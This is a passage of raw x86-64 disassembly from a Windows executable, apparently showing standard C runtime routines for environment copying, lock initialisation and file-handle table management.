   1400073bd:	4c 8b f0             	mov    %rax,%r14
   1400073c0:	e8 93 e4 ff ff       	call   0x140005858
   1400073c5:	4d 85 f6             	test   %r14,%r14
   1400073c8:	74 cb                	je     0x140007395
   1400073ca:	4d 89 3c de          	mov    %r15,(%r14,%rbx,8)
   1400073ce:	49 89 74 de 08       	mov    %rsi,0x8(%r14,%rbx,8)
   1400073d3:	4c 89 35 5e 09 01 00 	mov    %r14,0x1095e(%rip)        # 0x140017d38
   1400073da:	48 8b fe             	mov    %rsi,%rdi
   1400073dd:	39 74 24 78          	cmp    %esi,0x78(%rsp)
   1400073e1:	0f 84 8e 00 00 00    	je     0x140007475
   1400073e7:	48 83 cd ff          	or     $0xffffffffffffffff,%rbp
   1400073eb:	4c 8b f5             	mov    %rbp,%r14
   1400073ee:	49 ff c6             	inc    %r14
   1400073f1:	43 38 34 37          	cmp    %sil,(%r15,%r14,1)
   1400073f5:	75 f7                	jne    0x1400073ee
   1400073f7:	ba 01 00 00 00       	mov    $0x1,%edx
   1400073fc:	49 8d 4e 02          	lea    0x2(%r14),%rcx
   140007400:	e8 db e3 ff ff       	call   0x1400057e0
   140007405:	48 8b d8             	mov    %rax,%rbx
   140007408:	48 85 c0             	test   %rax,%rax
   14000740b:	74 47                	je     0x140007454
   14000740d:	4d 8b c7             	mov    %r15,%r8
   140007410:	49 8d 56 02          	lea    0x2(%r14),%rdx
   140007414:	48 8b c8             	mov    %rax,%rcx
   140007417:	e8 90 d8 ff ff       	call   0x140004cac
   14000741c:	85 c0                	test   %eax,%eax
   14000741e:	75 77                	jne    0x140007497
   140007420:	48 8b c3             	mov    %rbx,%rax
   140007423:	49 8d 4d 01          	lea    0x1(%r13),%rcx
   140007427:	49 2b c7             	sub    %r15,%rax
   14000742a:	48 03 c8             	add    %rax,%rcx
   14000742d:	f6 5c 24 70          	negb   0x70(%rsp)
   140007431:	48 1b d2             	sbb    %rdx,%rdx
   140007434:	48 23 d1             	and    %rcx,%rdx
   140007437:	40 88 71 ff          	mov    %sil,-0x1(%rcx)
   14000743b:	48 8b cb             	mov    %rbx,%rcx
   14000743e:	e8 31 31 00 00       	call   0x14000a574
   140007443:	85 c0                	test   %eax,%eax
   140007445:	75 0d                	jne    0x140007454
   140007447:	e8 74 e3 ff ff       	call   0x1400057c0
   14000744c:	8b f5                	mov    %ebp,%esi
   14000744e:	c7 00 2a 00 00 00    	movl   $0x2a,(%rax)
   140007454:	48 8b cb             	mov    %rbx,%rcx
   140007457:	e8 fc e3 ff ff       	call   0x140005858
   14000745c:	eb 17                	jmp    0x140007475
   14000745e:	e8 5d e3 ff ff       	call   0x1400057c0
   140007463:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140007467:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   14000746d:	8b ee                	mov    %esi,%ebp
   14000746f:	8b f5                	mov    %ebp,%esi
   140007471:	8b ee                	mov    %esi,%ebp
   140007473:	8b f5                	mov    %ebp,%esi
   140007475:	48 8b cf             	mov    %rdi,%rcx
   140007478:	e8 db e3 ff ff       	call   0x140005858
   14000747d:	8b c6                	mov    %esi,%eax
   14000747f:	48 8b 9c 24 80 00 00 	mov    0x80(%rsp),%rbx
   140007486:	00 
   140007487:	48 83 c4 30          	add    $0x30,%rsp
   14000748b:	41 5f                	pop    %r15
   14000748d:	41 5e                	pop    %r14
   14000748f:	41 5d                	pop    %r13
   140007491:	41 5c                	pop    %r12
   140007493:	5f                   	pop    %rdi
   140007494:	5e                   	pop    %rsi
   140007495:	5d                   	pop    %rbp
   140007496:	c3                   	ret
   140007497:	45 33 c9             	xor    %r9d,%r9d
   14000749a:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000749f:	45 33 c0             	xor    %r8d,%r8d
   1400074a2:	33 d2                	xor    %edx,%edx
   1400074a4:	33 c9                	xor    %ecx,%ecx
   1400074a6:	e8 15 e2 ff ff       	call   0x1400056c0
   1400074ab:	cc                   	int3
   1400074ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400074b1:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400074b6:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400074bb:	41 56                	push   %r14
   1400074bd:	48 83 ec 30          	sub    $0x30,%rsp
   1400074c1:	48 8b f9             	mov    %rcx,%rdi
   1400074c4:	48 85 c9             	test   %rcx,%rcx
   1400074c7:	75 18                	jne    0x1400074e1
   1400074c9:	33 c0                	xor    %eax,%eax
   1400074cb:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400074d0:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400074d5:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400074da:	48 83 c4 30          	add    $0x30,%rsp
   1400074de:	41 5e                	pop    %r14
   1400074e0:	c3                   	ret
   1400074e1:	33 c9                	xor    %ecx,%ecx
   1400074e3:	48 8b c7             	mov    %rdi,%rax
   1400074e6:	48 39 0f             	cmp    %rcx,(%rdi)
   1400074e9:	74 0d                	je     0x1400074f8
   1400074eb:	48 ff c1             	inc    %rcx
   1400074ee:	48 8d 40 08          	lea    0x8(%rax),%rax
   1400074f2:	48 83 38 00          	cmpq   $0x0,(%rax)
   1400074f6:	75 f3                	jne    0x1400074eb
   1400074f8:	48 ff c1             	inc    %rcx
   1400074fb:	ba 08 00 00 00       	mov    $0x8,%edx
   140007500:	e8 db e2 ff ff       	call   0x1400057e0
   140007505:	48 8b d8             	mov    %rax,%rbx
   140007508:	48 85 c0             	test   %rax,%rax
   14000750b:	74 7e                	je     0x14000758b
   14000750d:	48 8b 07             	mov    (%rdi),%rax
   140007510:	48 85 c0             	test   %rax,%rax
   140007513:	74 51                	je     0x140007566
   140007515:	4c 8b f3             	mov    %rbx,%r14
   140007518:	4c 2b f7             	sub    %rdi,%r14
   14000751b:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   14000751f:	48 ff c6             	inc    %rsi
   140007522:	80 3c 30 00          	cmpb   $0x0,(%rax,%rsi,1)
   140007526:	75 f7                	jne    0x14000751f
   140007528:	ba 01 00 00 00       	mov    $0x1,%edx
   14000752d:	48 8d 4e 01          	lea    0x1(%rsi),%rcx
   140007531:	e8 aa e2 ff ff       	call   0x1400057e0
   140007536:	33 c9                	xor    %ecx,%ecx
   140007538:	49 89 04 3e          	mov    %rax,(%r14,%rdi,1)
   14000753c:	e8 17 e3 ff ff       	call   0x140005858
   140007541:	49 8b 0c 3e          	mov    (%r14,%rdi,1),%rcx
   140007545:	48 85 c9             	test   %rcx,%rcx
   140007548:	74 41                	je     0x14000758b
   14000754a:	4c 8b 07             	mov    (%rdi),%r8
   14000754d:	48 8d 56 01          	lea    0x1(%rsi),%rdx
   140007551:	e8 56 d7 ff ff       	call   0x140004cac
   140007556:	85 c0                	test   %eax,%eax
   140007558:	75 1b                	jne    0x140007575
   14000755a:	48 83 c7 08          	add    $0x8,%rdi
   14000755e:	48 8b 07             	mov    (%rdi),%rax
   140007561:	48 85 c0             	test   %rax,%rax
   140007564:	75 b5                	jne    0x14000751b
   140007566:	33 c9                	xor    %ecx,%ecx
   140007568:	e8 eb e2 ff ff       	call   0x140005858
   14000756d:	48 8b c3             	mov    %rbx,%rax
   140007570:	e9 56 ff ff ff       	jmp    0x1400074cb
   140007575:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   14000757b:	45 33 c9             	xor    %r9d,%r9d
   14000757e:	45 33 c0             	xor    %r8d,%r8d
   140007581:	33 d2                	xor    %edx,%edx
   140007583:	33 c9                	xor    %ecx,%ecx
   140007585:	e8 36 e1 ff ff       	call   0x1400056c0
   14000758a:	cc                   	int3
   14000758b:	e8 b0 d6 ff ff       	call   0x140004c40
   140007590:	cc                   	int3
   140007591:	cc                   	int3
   140007592:	cc                   	int3
   140007593:	cc                   	int3
   140007594:	e9 f3 fb ff ff       	jmp    0x14000718c
   140007599:	cc                   	int3
   14000759a:	cc                   	int3
   14000759b:	cc                   	int3
   14000759c:	40 53                	rex push %rbx
   14000759e:	48 83 ec 20          	sub    $0x20,%rsp
   1400075a2:	33 db                	xor    %ebx,%ebx
   1400075a4:	48 8d 15 65 08 01 00 	lea    0x10865(%rip),%rdx        # 0x140017e10
   1400075ab:	45 33 c0             	xor    %r8d,%r8d
   1400075ae:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   1400075b2:	48 8d 0c ca          	lea    (%rdx,%rcx,8),%rcx
   1400075b6:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400075bb:	e8 f8 13 00 00       	call   0x1400089b8
   1400075c0:	85 c0                	test   %eax,%eax
   1400075c2:	74 11                	je     0x1400075d5
   1400075c4:	ff 05 76 0a 01 00    	incl   0x10a76(%rip)        # 0x140018040
   1400075ca:	ff c3                	inc    %ebx
   1400075cc:	83 fb 0e             	cmp    $0xe,%ebx
   1400075cf:	72 d3                	jb     0x1400075a4
   1400075d1:	b0 01                	mov    $0x1,%al
   1400075d3:	eb 09                	jmp    0x1400075de
   1400075d5:	33 c9                	xor    %ecx,%ecx
   1400075d7:	e8 24 00 00 00       	call   0x140007600
   1400075dc:	32 c0                	xor    %al,%al
   1400075de:	48 83 c4 20          	add    $0x20,%rsp
   1400075e2:	5b                   	pop    %rbx
   1400075e3:	c3                   	ret
   1400075e4:	48 63 c1             	movslq %ecx,%rax
   1400075e7:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   1400075eb:	48 8d 05 1e 08 01 00 	lea    0x1081e(%rip),%rax        # 0x140017e10
   1400075f2:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   1400075f6:	48 ff 25 ab 6a 00 00 	rex.W jmp *0x6aab(%rip)        # 0x14000e0a8
   1400075fd:	cc                   	int3
   1400075fe:	cc                   	int3
   1400075ff:	cc                   	int3
   140007600:	40 53                	rex push %rbx
   140007602:	48 83 ec 20          	sub    $0x20,%rsp
   140007606:	8b 1d 34 0a 01 00    	mov    0x10a34(%rip),%ebx        # 0x140018040
   14000760c:	eb 1d                	jmp    0x14000762b
   14000760e:	48 8d 05 fb 07 01 00 	lea    0x107fb(%rip),%rax        # 0x140017e10
   140007615:	ff cb                	dec    %ebx
   140007617:	48 8d 0c 9b          	lea    (%rbx,%rbx,4),%rcx
   14000761b:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000761f:	ff 15 93 6a 00 00    	call   *0x6a93(%rip)        # 0x14000e0b8
   140007625:	ff 0d 15 0a 01 00    	decl   0x10a15(%rip)        # 0x140018040
   14000762b:	85 db                	test   %ebx,%ebx
   14000762d:	75 df                	jne    0x14000760e
   14000762f:	b0 01                	mov    $0x1,%al
   140007631:	48 83 c4 20          	add    $0x20,%rsp
   140007635:	5b                   	pop    %rbx
   140007636:	c3                   	ret
   140007637:	cc                   	int3
   140007638:	48 63 c1             	movslq %ecx,%rax
   14000763b:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000763f:	48 8d 05 ca 07 01 00 	lea    0x107ca(%rip),%rax        # 0x140017e10
   140007646:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   14000764a:	48 ff 25 5f 6a 00 00 	rex.W jmp *0x6a5f(%rip)        # 0x14000e0b0
   140007651:	cc                   	int3
   140007652:	cc                   	int3
   140007653:	cc                   	int3
   140007654:	40 53                	rex push %rbx
   140007656:	48 83 ec 20          	sub    $0x20,%rsp
   14000765a:	33 db                	xor    %ebx,%ebx
   14000765c:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140007660:	65 48 8b 04 25 60 00 	mov    %gs:0x60,%rax
   140007667:	00 00 
   140007669:	48 8b 48 20          	mov    0x20(%rax),%rcx
   14000766d:	39 59 08             	cmp    %ebx,0x8(%rcx)
   140007670:	7c 11                	jl     0x140007683
   140007672:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140007677:	e8 a8 10 00 00       	call   0x140008724
   14000767c:	83 7c 24 30 01       	cmpl   $0x1,0x30(%rsp)
   140007681:	74 05                	je     0x140007688
   140007683:	bb 01 00 00 00       	mov    $0x1,%ebx
   140007688:	8b c3                	mov    %ebx,%eax
   14000768a:	48 83 c4 20          	add    $0x20,%rsp
   14000768e:	5b                   	pop    %rbx
   14000768f:	c3                   	ret
   140007690:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007695:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000769a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000769f:	57                   	push   %rdi
   1400076a0:	48 83 ec 20          	sub    $0x20,%rsp
   1400076a4:	ba 48 00 00 00       	mov    $0x48,%edx
   1400076a9:	8d 4a f8             	lea    -0x8(%rdx),%ecx
   1400076ac:	e8 2f e1 ff ff       	call   0x1400057e0
   1400076b1:	33 f6                	xor    %esi,%esi
   1400076b3:	48 8b d8             	mov    %rax,%rbx
   1400076b6:	48 85 c0             	test   %rax,%rax
   1400076b9:	74 5b                	je     0x140007716
   1400076bb:	48 8d a8 00 12 00 00 	lea    0x1200(%rax),%rbp
   1400076c2:	48 3b c5             	cmp    %rbp,%rax
   1400076c5:	74 4c                	je     0x140007713
   1400076c7:	48 8d 78 30          	lea    0x30(%rax),%rdi
   1400076cb:	48 8d 4f d0          	lea    -0x30(%rdi),%rcx
   1400076cf:	45 33 c0             	xor    %r8d,%r8d
   1400076d2:	ba a0 0f 00 00       	mov    $0xfa0,%edx
   1400076d7:	e8 dc 12 00 00       	call   0x1400089b8
   1400076dc:	48 83 4f f8 ff       	orq    $0xffffffffffffffff,-0x8(%rdi)
   1400076e1:	48 8d 4f 0e          	lea    0xe(%rdi),%rcx
   1400076e5:	80 67 0d f8          	andb   $0xf8,0xd(%rdi)
   1400076e9:	8b c6                	mov    %esi,%eax
   1400076eb:	48 89 37             	mov    %rsi,(%rdi)
   1400076ee:	c7 47 08 00 00 0a 0a 	movl   $0xa0a0000,0x8(%rdi)
   1400076f5:	c6 47 0c 0a          	movb   $0xa,0xc(%rdi)
   1400076f9:	40 88 31             	mov    %sil,(%rcx)
   1400076fc:	ff c0                	inc    %eax
   1400076fe:	48 ff c1             	inc    %rcx
   140007701:	83 f8 05             	cmp    $0x5,%eax
   140007704:	72 f3                	jb     0x1400076f9
   140007706:	48 83 c7 48          	add    $0x48,%rdi
   14000770a:	48 8d 47 d0          	lea    -0x30(%rdi),%rax
   14000770e:	48 3b c5             	cmp    %rbp,%rax
   140007711:	75 b8                	jne    0x1400076cb
   140007713:	48 8b f3             	mov    %rbx,%rsi
   140007716:	33 c9                	xor    %ecx,%ecx
   140007718:	e8 3b e1 ff ff       	call   0x140005858
   14000771d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007722:	48 8b c6             	mov    %rsi,%rax
   140007725:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000772a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000772f:	48 83 c4 20          	add    $0x20,%rsp
   140007733:	5f                   	pop    %rdi
   140007734:	c3                   	ret
   140007735:	cc                   	int3
   140007736:	cc                   	int3
   140007737:	cc                   	int3
   140007738:	48 85 c9             	test   %rcx,%rcx
   14000773b:	74 4a                	je     0x140007787
   14000773d:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007742:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007747:	57                   	push   %rdi
   140007748:	48 83 ec 20          	sub    $0x20,%rsp
   14000774c:	48 8d b1 00 12 00 00 	lea    0x1200(%rcx),%rsi
   140007753:	48 8b d9             	mov    %rcx,%rbx
   140007756:	48 8b f9             	mov    %rcx,%rdi
   140007759:	48 3b ce             	cmp    %rsi,%rcx
   14000775c:	74 12                	je     0x140007770
   14000775e:	48 8b cf             	mov    %rdi,%rcx
   140007761:	ff 15 51 69 00 00    	call   *0x6951(%rip)        # 0x14000e0b8
   140007767:	48 83 c7 48          	add    $0x48,%rdi
   14000776b:	48 3b fe             	cmp    %rsi,%rdi
   14000776e:	75 ee                	jne    0x14000775e
   140007770:	48 8b cb             	mov    %rbx,%rcx
   140007773:	e8 e0 e0 ff ff       	call   0x140005858
   140007778:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000777d:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140007782:	48 83 c4 20          	add    $0x20,%rsp
   140007786:	5f                   	pop    %rdi
   140007787:	c3                   	ret
   140007788:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000778d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140007792:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140007797:	41 57                	push   %r15
   140007799:	48 83 ec 30          	sub    $0x30,%rsp
   14000779d:	8b f1                	mov    %ecx,%esi
   14000779f:	81 f9 00 20 00 00    	cmp    $0x2000,%ecx
   1400077a5:	72 29                	jb     0x1400077d0
   1400077a7:	e8 14 e0 ff ff       	call   0x1400057c0
   1400077ac:	bb 09 00 00 00       	mov    $0x9,%ebx
   1400077b1:	89 18                	mov    %ebx,(%rax)
   1400077b3:	e8 e8 de ff ff       	call   0x1400056a0
   1400077b8:	8b c3                	mov    %ebx,%eax
   1400077ba:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400077bf:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1400077c4:	48 8b 7c 24 50       	mov    0x50(%rsp),%rdi
   1400077c9:	48 83 c4 30          	add    $0x30,%rsp
   1400077cd:	41 5f                	pop    %r15
   1400077cf:	c3                   	ret
   1400077d0:	33 ff                	xor    %edi,%edi
   1400077d2:	8d 4f 07             	lea    0x7(%rdi),%ecx
   1400077d5:	e8 0a fe ff ff       	call   0x1400075e4
   1400077da:	90                   	nop
   1400077db:	8b df                	mov    %edi,%ebx
   1400077dd:	8b 05 6d 0c 01 00    	mov    0x10c6d(%rip),%eax        # 0x140018450
   1400077e3:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400077e8:	3b f0                	cmp    %eax,%esi
   1400077ea:	7c 36                	jl     0x140007822
   1400077ec:	4c 8d 3d 5d 08 01 00 	lea    0x1085d(%rip),%r15        # 0x140018050
   1400077f3:	49 39 3c df          	cmp    %rdi,(%r15,%rbx,8)
   1400077f7:	74 02                	je     0x1400077fb
   1400077f9:	eb 22                	jmp    0x14000781d
   1400077fb:	e8 90 fe ff ff       	call   0x140007690
   140007800:	49 89 04 df          	mov    %rax,(%r15,%rbx,8)
   140007804:	48 85 c0             	test   %rax,%rax
   140007807:	75 05                	jne    0x14000780e
   140007809:	8d 78 0c             	lea    0xc(%rax),%edi
   14000780c:	eb 14                	jmp    0x140007822
   14000780e:	8b 05 3c 0c 01 00    	mov    0x10c3c(%rip),%eax        # 0x140018450
   140007814:	83 c0 40             	add    $0x40,%eax
   140007817:	89 05 33 0c 01 00    	mov    %eax,0x10c33(%rip)        # 0x140018450
   14000781d:	48 ff c3             	inc    %rbx
   140007820:	eb c1                	jmp    0x1400077e3
   140007822:	b9 07 00 00 00       	mov    $0x7,%ecx
   140007827:	e8 0c fe ff ff       	call   0x140007638
   14000782c:	8b c7                	mov    %edi,%eax
   14000782e:	eb 8a                	jmp    0x1400077ba
   140007830:	48 63 d1             	movslq %ecx,%rdx
   140007833:	4c 8d 05 16 08 01 00 	lea    0x10816(%rip),%r8        # 0x140018050
   14000783a:	48 8b c2             	mov    %rdx,%rax
   14000783d:	83 e2 3f             	and    $0x3f,%edx
   140007840:	48 c1 f8 06          	sar    $0x6,%rax
   140007844:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140007848:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   14000784c:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007850:	48 ff 25 51 68 00 00 	rex.W jmp *0x6851(%rip)        # 0x14000e0a8
   140007857:	cc                   	int3
   140007858:	48 63 d1             	movslq %ecx,%rdx
   14000785b:	4c 8d 05 ee 07 01 00 	lea    0x107ee(%rip),%r8        # 0x140018050
   140007862:	48 8b c2             	mov    %rdx,%rax
   140007865:	83 e2 3f             	and    $0x3f,%edx
   140007868:	48 c1 f8 06          	sar    $0x6,%rax
   14000786c:	48 8d 0c d2          	lea    (%rdx,%rdx,8),%rcx
   140007870:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007874:	48 8d 0c c8          	lea    (%rax,%rcx,8),%rcx
   140007878:	48 ff 25 31 68 00 00 	rex.W jmp *0x6831(%rip)        # 0x14000e0b0
   14000787f:	cc                   	int3
   140007880:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140007885:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000788a:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   14000788f:	41 56                	push   %r14
   140007891:	48 83 ec 20          	sub    $0x20,%rsp
   140007895:	48 63 d9             	movslq %ecx,%rbx
   140007898:	85 c9                	test   %ecx,%ecx
   14000789a:	78 72                	js     0x14000790e
   14000789c:	3b 1d ae 0b 01 00    	cmp    0x10bae(%rip),%ebx        # 0x140018450
   1400078a2:	73 6a                	jae    0x14000790e
   1400078a4:	48 8b c3             	mov    %rbx,%rax
   1400078a7:	4c 8d 35 a2 07 01 00 	lea    0x107a2(%rip),%r14        # 0x140018050
   1400078ae:	83 e0 3f             	and    $0x3f,%eax
   1400078b1:	48 8b f3             	mov    %rbx,%rsi
   1400078b4:	48 c1 fe 06          	sar    $0x6,%rsi
   1400078b8:	48 8d 3c c0          	lea    (%rax,%rax,8),%rdi
   1400078bc:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   1400078c0:	f6 44 f8 38 01       	testb  $0x1,0x38(%rax,%rdi,8)
   1400078c5:	74 47                	je     0x14000790e
   1400078c7:	48 83 7c f8 28 ff    	cmpq   $0xffffffffffffffff,0x28(%rax,%rdi,8)
   1400078cd:	74 3f                	je     0x14000790e
   1400078cf:	e8 b8 c0 ff ff       	call   0x14000398c
   1400078d4:	83 f8 01             	cmp    $0x1,%eax
   1400078d7:	75 27                	jne    0x140007900
   1400078d9:	85 db                	test   %ebx,%ebx
   1400078db:	74 16                	je     0x1400078f3
   1400078dd:	2b d8                	sub    %eax,%ebx
   1400078df:	74 0b                	je     0x1400078ec
   1400078e1:	3b d8                	cmp    %eax,%ebx
   1400078e3:	75 1b                	jne    0x140007900
   1400078e5:	b9 f4 ff ff ff       	mov    $0xfffffff4,%ecx
   1400078ea:	eb 0c                	jmp    0x1400078f8
   1400078ec:	b9 f5 ff ff ff       	mov    $0xfffffff5,%ecx
   1400078f1:	eb 05                	jmp    0x1400078f8
   1400078f3:	b9 f6 ff ff ff       	mov    $0xfffffff6,%ecx
   1400078f8:	33 d2                	xor    %edx,%edx
   1400078fa:	ff 15 b0 68 00 00    	call   *0x68b0(%rip)        # 0x14000e1b0
   140007900:	49 8b 04 f6          	mov    (%r14,%rsi,8),%rax
   140007904:	48 83 4c f8 28 ff    	orq    $0xffffffffffffffff,0x28(%rax,%rdi,8)
   14000790a:	33 c0                	xor    %eax,%eax
   14000790c:	eb 16                	jmp    0x140007924
   14000790e:	e8 ad de ff ff       	call   0x1400057c0
   140007913:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007919:	e8 82 de ff ff       	call   0x1400057a0
   14000791e:	83 20 00             	andl   $0x0,(%rax)
   140007921:	83 c8 ff             	or     $0xffffffff,%eax
   140007924:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007929:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000792e:	48 8b 7c 24 40       	mov    0x40(%rsp),%rdi
   140007933:	48 83 c4 20          	add    $0x20,%rsp
   140007937:	41 5e                	pop    %r14
   140007939:	c3                   	ret
   14000793a:	cc                   	int3
   14000793b:	cc                   	int3
   14000793c:	48 83 ec 28          	sub    $0x28,%rsp
   140007940:	83 f9 fe             	cmp    $0xfffffffe,%ecx
   140007943:	75 15                	jne    0x14000795a
   140007945:	e8 56 de ff ff       	call   0x1400057a0
   14000794a:	83 20 00             	andl   $0x0,(%rax)
   14000794d:	e8 6e de ff ff       	call   0x1400057c0
   140007952:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   140007958:	eb 4e                	jmp    0x1400079a8
   14000795a:	85 c9                	test   %ecx,%ecx
   14000795c:	78 32                	js     0x140007990
   14000795e:	3b 0d ec 0a 01 00    	cmp    0x10aec(%rip),%ecx        # 0x140018450
   140007964:	73 2a                	jae    0x140007990
   140007966:	48 63 c9             	movslq %ecx,%rcx
   140007969:	4c 8d 05 e0 06 01 00 	lea    0x106e0(%rip),%r8        # 0x140018050
   140007970:	48 8b c1             	mov    %rcx,%rax
   140007973:	83 e1 3f             	and    $0x3f,%ecx
   140007976:	48 c1 f8 06          	sar    $0x6,%rax
   14000797a:	48 8d 14 c9          	lea    (%rcx,%rcx,8),%rdx
   14000797e:	49 8b 04 c0          	mov    (%r8,%rax,8),%rax
   140007982:	f6 44 d0 38 01       	testb  $0x1,0x38(%rax,%rdx,8)
   140007987:	74 07                	je     0x140007990
   140007989:	48 8b 44 d0 28       	mov    0x28(%rax,%rdx,8),%rax
   14000798e:	eb 1c                	jmp    0x1400079ac
   140007990:	e8 0b de ff ff       	call   0x1400057a0
   140007995:	83 20 00             	andl   $0x0,(%rax)
   140007998:	e8 23 de ff ff       	call   0x1400057c0
   14000799d:	c7 00 09 00 00 00    	movl   $0x9,(%rax)
   1400079a3:	e8 f8 dc ff ff       	call   0x1400056a0
   1400079a8:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400079ac:	48 83 c4 28          	add    $0x28,%rsp
   1400079b0:	c3                   	ret
   1400079b1:	cc                   	int3
   1400079b2:	cc                   	int3
   1400079b3:	cc                   	int3
   1400079b4:	8b 05 8a 06 01 00    	mov    0x1068a(%rip),%eax        # 0x140018044
   1400079ba:	b9 00 40 00 00       	mov    $0x4000,%ecx
   1400079bf:	85 c0                	test   %eax,%eax
   1400079c1:	0f 44 c1             	cmove  %ecx,%eax
   1400079c4:	89 05 7a 06 01 00    	mov    %eax,0x1067a(%rip)        # 0x140018044
   1400079ca:	33 c0                	xor    %eax,%eax
   1400079cc:	c3                   	ret
   1400079cd:	cc                   	int3
   1400079ce:	cc                   	int3
   1400079cf:	cc                   	int3
   1400079d0:	48 8b c4             	mov    %rsp,%rax
   1400079d3:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400079d7:	48 89 68 10          	mov    %rbp,0x10(%rax)
   1400079db:	48 89 70 18          	mov    %rsi,0x18(%rax)
   1400079df:	48 89 78 20          	mov    %rdi,0x20(%rax)
   1400079e3:	41 56                	push   %r14
   1400079e5:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400079ec:	48 8d 48 88          	lea    -0x78(%rax),%rcx
   1400079f0:	ff 15 7a 66 00 00    	call   *0x667a(%rip)        # 0x14000e070
   1400079f6:	45 33 f6             	xor    %r14d,%r14d
   1400079f9:	66 44 39 74 24 62    	cmp    %r14w,0x62(%rsp)
   1400079ff:	0f 84 9a 00 00 00    	je     0x140007a9f
   140007a05:	48 8b 44 24 68       	mov    0x68(%rsp),%rax
   140007a0a:	48 85 c0             	test   %rax,%rax
   140007a0d:	0f 84 8c 00 00 00    	je     0x140007a9f
   140007a13:	48 63 18             	movslq (%rax),%rbx
   140007a16:	48 8d 70 04          	lea    0x4(%rax),%rsi
   140007a1a:	bf 00 20 00 00       	mov    $0x2000,%edi
   140007a1f:	48 03 de             	add    %rsi,%rbx
   140007a22:	39 38                	cmp    %edi,(%rax)
   140007a24:	0f 4c 38             	cmovl  (%rax),%edi
   140007a27:	8b cf                	mov    %edi,%ecx
   140007a29:	e8 5a fd ff ff       	call   0x140007788
   140007a2e:	3b 3d 1c 0a 01 00    	cmp    0x10a1c(%rip),%edi        # 0x140018450
   140007a34:	0f 4f 3d 15 0a 01 00 	cmovg  0x10a15(%rip),%edi        # 0x140018450
   140007a3b:	85 ff                	test   %edi,%edi
   140007a3d:	74 60                	je     0x140007a9f
   140007a3f:	41 8b ee             	mov    %r14d,%ebp
   140007a42:	48 83 3b ff          	cmpq   $0xffffffffffffffff,(%rbx)
   140007a46:	74 47                	je     0x140007a8f
   140007a48:	48 83 3b fe          	cmpq   $0xfffffffffffffffe,(%rbx)
   140007a4c:	74 41                	je     0x140007a8f
   140007a4e:	f6 06 01             	testb  $0x1,(%rsi)
   140007a51:	74 3c                	je     0x140007a8f
   140007a53:	f6 06 08             	testb  $0x8,(%rsi)
   140007a56:	75 0d                	jne    0x140007a65
   140007a58:	48 8b 0b             	mov    (%rbx),%rcx
   140007a5b:	ff 15 57 67 00 00    	call   *0x6757(%rip)        # 0x14000e1b8
   140007a61:	85 c0                	test   %eax,%eax
   140007a63:	74 2a                	je     0x140007a8f
   140007a65:	48 8b c5             	mov    %rbp,%rax
   140007a68:	4c 8d 05 e1 05 01 00 	lea    0x105e1(%rip),%r8        # 0x140018050
   140007a6f:	48 8b cd             	mov    %rbp,%rcx
   140007a72:	48 c1 f9 06          	sar    $0x6,%rcx
   140007a76:	83 e0 3f             	and    $0x3f,%eax
   140007a79:	49 8b 0c c8          	mov    (%r8,%rcx,8),%rcx
   140007a7d:	48 8d 14 c0          	lea    (%rax,%rax,8),%rdx
   140007a81:	48 8b 03             	mov    (%rbx),%rax
   140007a84:	48 89 44 d1 28       	mov    %rax,0x28(%rcx,%rdx,8)
   140007a89:	8a 06                	mov    (%rsi),%al
   140007a8b:	88 44 d1 38          	mov    %al,0x38(%rcx,%rdx,8)
   140007a8f:	48 ff c5             	inc    %rbp
   140007a92:	48 ff c6             	inc    %rsi
   140007a95:	48 83 c3 08          	add    $0x8,%rbx
